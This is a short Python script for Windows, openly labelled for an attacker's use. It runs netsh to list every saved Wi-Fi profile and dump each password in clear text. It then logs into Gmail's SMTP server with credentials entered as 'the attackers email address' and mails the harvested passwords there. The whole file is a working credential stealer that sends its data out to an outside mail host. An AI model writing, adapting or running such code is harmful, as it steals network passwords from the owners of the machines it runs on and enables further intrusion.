import subprocess #used for geting and executing the windows 
import re #used for importing regular expression
import sys

# making windows to execute a command to show profiles
show_all_profiles_command= "netsh wlan show profile"#command in windows that is used to identify connected wifi to the laptop or computer
all_profiles_results =subprocess.check_output(show_all_profiles_command, shell=True)
#print(all_profiles_results.decode(sys.stdout.encoding)) #testing part of the code if successful

sorting_profiles= all_profiles_results.decode(sys.stdout.encoding)#decoding the output
regex_pattern = '(?:Profile\s*:\s)(.*)'#regex pattern to be followed so as to be able to identify the name of the wifi
all_profile_names= re.findall(regex_pattern, sorting_profiles)#declaring the output given from 
new_lines=[x.rstrip() for x in all_profile_names] #removing all of the \r and \n so as to be used in a list
#print(new_lines)#used for testing purposes

#obtaining the wifi key via the command prompt
password_result=""#variable to store the output
for network_list in new_lines:
	showing_passwords_command='netsh wlan show profile name=\"'+network_list+'\" key=clear'
	showing_passwords_results=subprocess.check_output(showing_passwords_command, shell=True)
	showing_passwords_resultes=showing_passwords_results.decode(encoding='windows-1252')#changing the byte to str
	password_result += showing_passwords_resultes
print(password_result)


#sending the output of the command to the e-mail
#setting up an email server and importing necessary modules 
import smtplib
from getpass import getpass

host ='smtp.gmail.com'#this is the host of the email server and intialization of the server
port ='587'#initialization of the port to be used when sending the email address
server = smtplib.SMTP(host, port)
server.starttls()#making a secure channel when sending the mail messages to your email address
email_address=input("enter the attackers email address here:  ")#initialize your email account here
email_password=getpass("enter the attackers password: ")#initialize the email address password
server.login(email_address, email_password)#doing the actual login to the email
password_message= password_result#substituting the message body with the output of the commnds given
server.sendmail(email_address, email_address, password_message)#sending the email to respective recipient
server.quit()#loging out from the server

#giving error messages when there is a wrong login and notifying if third parties are not allowed in your e-mail configuration.